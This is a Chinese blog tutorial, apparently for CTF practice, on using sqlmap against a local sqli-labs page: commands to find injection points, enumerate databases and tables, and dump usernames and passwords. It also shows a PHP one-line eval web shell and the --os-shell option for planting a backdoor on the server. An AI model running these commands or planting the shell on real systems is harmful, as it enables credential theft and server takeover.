@@ -1,0 +1,278 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入之sqlmap的使用方法 | BayMRX</title><meta name="author" content="BayMRX."><meta name="copyright" content="BayMRX."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="使用sqlmap进行SQL注入 1.扫描注入漏洞类型 语法：-u [url] 1python2 sqlmap.py -u &amp;quot;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;sqli&amp;#x2F;Less-1&amp;#x2F;?id&amp;#x3D;1&amp;quot; 将我们要扫描的网站URL填入到命令中，运行后会输出结果：  从结果中可以看到网站的注"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://baymrx.me/posts/2f65c0c4"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//www.clarity.ms"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="IbymInmKSwzYJ23XxtbfrpA2D96JFdilyCVyLbs4GgM"/><meta name="baidu-site-verification" content="code-BtlqGhZrrC"/><meta name="bing_site_verification" content="b9caa36ba366bb642aeb89e4131554ce"/><meta name="qihu_site_verification" content="6f988dabfd2b02d14e6417fe33a6724d"/><meta name="yandex_site_verification" content="bfe4578ce1f4a696"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d2fc5e9d22507d4a0c94eb1ada8ba3d3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-BMPDN6HEFJ"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BMPDN6HEFJ');
+</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;5871bbc4381146fa8bd5f570f00a53f3&quot;}"></script><script>(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+})(window, document, "clarity", "script", "6ehiseir6t");</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":100,"languages":{"author":"作者: BayMRX.","link":"链接: ","source":"来源: BayMRX","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入之sqlmap的使用方法',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-07 13:12:29'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200707204638.png')"><nav id="nav"><span id="blog-info"><a href="/" title="BayMRX"><span class="site-name">BayMRX</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/message/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入之sqlmap的使用方法</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-07T02:22:33.000Z" title="发表于 2020-07-07 10:22:33">2020-07-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-07T05:12:29.433Z" title="更新于 2024-01-07 13:12:29">2024-01-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web/Tools/">Tools</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">884</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入之sqlmap的使用方法"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/2f65c0c4#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="使用sqlmap进行SQL注入">使用sqlmap进行SQL注入</h2>
+<h3 id="1-扫描注入漏洞类型">1.扫描注入漏洞类型</h3>
+<p>语法：<code>-u [url]</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span></span><br></pre></td></tr></table></figure>
+<p>将我们要扫描的网站URL填入到命令中，运行后会输出结果：</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707111806514.png" alt="image-20200707111806514"></p>
+<p>从结果中可以看到网站的注入点在id这里，是以GET的方式提交的，并且网站存在4中类型的SQL注入漏洞，分别是布尔型盲注、报错注入、时间型盲注和联合查询注入</p>
+<h3 id="2-查询数据库名">2.查询数据库名</h3>
+<p>语法：<code>-u [url] --current-db</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">--current-db</span></span><br></pre></td></tr></table></figure>
+<p>运行完成后会直接显示出当前使用的数据库</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707112737101.png" alt="image-20200707112737101"></p>
+<h3 id="3-查表名">3.查表名</h3>
+<p>语法：<code>-u [url] -D [database_name] --tables</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">--tables</span></span><br></pre></td></tr></table></figure>
+<p>工具会自动查出数据库中所包含的数据表</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707133149836.png" alt="image-20200707133149836"></p>
+<h3 id="4-查字段（可选）">4.查字段（可选）</h3>
+<p>查完数据表后就可以选一个我们需要的表进行下一步的查询</p>
+<p>查询users表中存在的字段</p>
+<p>语法：<code>-u [url] -D [database_name] -T [table_name] --columns</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">--columns</span></span><br></pre></td></tr></table></figure>
+<p>会将表中的所有字段都进行输出</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707133845962.png" alt="image-20200707133845962"></p>
+<h3 id="5-查数据">5.查数据</h3>
+<p>当我们拿到了字段名后，就可以爆破每个字段的数据了</p>
+<p>语法：<code>-u [url] -D [database_name] -T [table_name] -C [column_name] --dump</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">-C</span> <span class="string">&quot;username,password&quot;</span> <span class="literal">--dump</span></span><br></pre></td></tr></table></figure>
+<p>我们选择了爆破username和password</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707134431168.png" alt="image-20200707134431168"></p>
+<p>⚠当然我们可以直接跳过第4步爆破字段名，直接将数据表中的所有数据爆破出来</p>
+<p>语法：<code>-u [url] -D [database_name] -T [table_name] --dump</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">-D</span> security <span class="literal">-T</span> users <span class="literal">--dump</span></span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707134858597.png" alt="image-20200707134858597"></p>
+<h3 id="使用sqlmap上传一句话木马">使用sqlmap上传一句话木马</h3>
+<p>一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qqq&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>我们可以使用sqlmap将一句话木马文件利用SQL注入漏洞上传到服务器中，并且会利用这个木马获取目标主机shell。它使用的其实是<code>select *** into outfile</code>语句，这语句的意思是将查询的表的内容导出到一个文件中。sqlmap就是利用这个特点将一句话木马导出为php文件到网站的目录中。</p>
+<p>来看一下sqlmap上传一句话木马并获取shell的语法</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://127.0.0.1/sqli/Less-1/?id=1&quot;</span> <span class="literal">--os-shell</span></span><br></pre></td></tr></table></figure>
+<p>运行后会提示选择web应用程序的语言</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707173222233.png" alt="image-20200707173222233"></p>
+<p>这里我们对应选择第4个选项的PHP</p>
+<p>然后会提示是否更深入泄露根路径，这里默认回车即可</p>
+<p>再然后会让选择想要被写入木马文件的目录，选择第2个</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707174042426.png" alt="image-20200707174042426"></p>
+<p>然后输入网站根目录的完整路径</p>
+<blockquote>
+<p>对于具体路径的获取，可以通过网站的报错信息获得，也可以通过自动生成的phpinfo.php(PHP探针文件)获得</p>
+</blockquote>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707175115679.png" alt="image-20200707175115679"></p>
+<p>对目录注入了木马文件之后，就可以直接获得目标服务器的shell了</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707202404125.png" alt="image-20200707202404125"></p>
+<p>如果我们使用浏览器访问注入的第一个php文件，会发现sqlmap开启了一个文件上传后门，可以任意上传任意文件到网站目录</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707202819227.png" alt="image-20200707202819227"></p>
+<p>如果访问第二个php文件，会提示未定义索引，并且会提示cmd是作为传入php文件的参数，猜测是POST方式的请求</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707203446084.png" alt="image-20200707203446084"></p>
+<p>使用HackBar用POST方式提交cmd参数，可以看到页面有输出</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200707203648584.png" alt="image-20200707203648584"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://baymrx.me">BayMRX.</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://baymrx.me/posts/2f65c0c4">https://baymrx.me/posts/2f65c0c4</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://baymrx.me" target="_blank">BayMRX</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/sqlmap/">sqlmap</a><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200707204638.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src= "/img/loading.gif" data-lazy-src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "/img/loading.gif" data-lazy-src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/ceba00c5" title="使用fabric-sdk-go搭建Hyperledger Fabric测试环境"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202208081326239.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">使用fabric-sdk-go搭建Hyperledger Fabric测试环境</div></div></a></div><div class="next-post pull-right"><a href="/posts/e73517db" title="SQL注入原理及注入过程"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200705230504.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SQL注入原理及注入过程</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/e73517db" title="SQL注入原理及注入过程"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200705230504.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-05</div><div class="title">SQL注入原理及注入过程</div></div></a></div><div><a href="/posts/38f474e5" title="AWVS漏洞扫描的使用过程"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200630191737.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-30</div><div class="title">AWVS漏洞扫描的使用过程</div></div></a></div><div><a href="/posts/6e251019" title="BurpSuite的4种常用功能使用"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/burpsuite-twittercard.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-29</div><div class="title">BurpSuite的4种常用功能使用</div></div></a></div><div><a href="/posts/7761df94" title="DVWA练习——CSRF漏洞原理"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200704200209.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-04</div><div class="title">DVWA练习——CSRF漏洞原理</div></div></a></div><div><a href="/posts/d3bdf29c" title="DVWA练习——XSS漏洞原理"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200702175005.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-02</div><div class="title">DVWA练习——XSS漏洞原理</div></div></a></div><div><a href="/posts/664e0a31" title="Nmap的几种常见扫描方式"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20200630151354.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-06-30</div><div class="title">Nmap的几种常见扫描方式</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">BayMRX.</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">33</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/BayMRX"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/BayMRX" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:mujian2009@126.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5"><span class="toc-text">使用sqlmap进行SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%AB%E6%8F%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-text">1.扫描注入漏洞类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-text">2.查询数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E8%A1%A8%E5%90%8D"><span class="toc-text">3.查表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%9F%A5%E5%AD%97%E6%AE%B5%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%89"><span class="toc-text">4.查字段（可选）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E6%95%B0%E6%8D%AE"><span class="toc-text">5.查数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8sqlmap%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-text">使用sqlmap上传一句话木马</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/946c99e6" title="2024 GitHub Student Developer Pack 学生开发包申请指南"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20240106182849.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024 GitHub Student Developer Pack 学生开发包申请指南"/></a><div class="content"><a class="title" href="/posts/946c99e6" title="2024 GitHub Student Developer Pack 学生开发包申请指南">2024 GitHub Student Developer Pack 学生开发包申请指南</a><time datetime="2024-01-06T10:27:15.000Z" title="发表于 2024-01-06 18:27:15">2024-01-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7bcf35fc" title="Oh-My-Zsh 安装&amp;配置"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/20230704144049.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Oh-My-Zsh 安装&amp;配置"/></a><div class="content"><a class="title" href="/posts/7bcf35fc" title="Oh-My-Zsh 安装&amp;配置">Oh-My-Zsh 安装&amp;配置</a><time datetime="2023-07-04T06:24:06.000Z" title="发表于 2023-07-04 14:24:06">2023-07-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5233648" title="Go SDK搭建多通道多orderer节点的Fabric环境"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/202208081326239.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go SDK搭建多通道多orderer节点的Fabric环境"/></a><div class="content"><a class="title" href="/posts/5233648" title="Go SDK搭建多通道多orderer节点的Fabric环境">Go SDK搭建多通道多orderer节点的Fabric环境</a><time 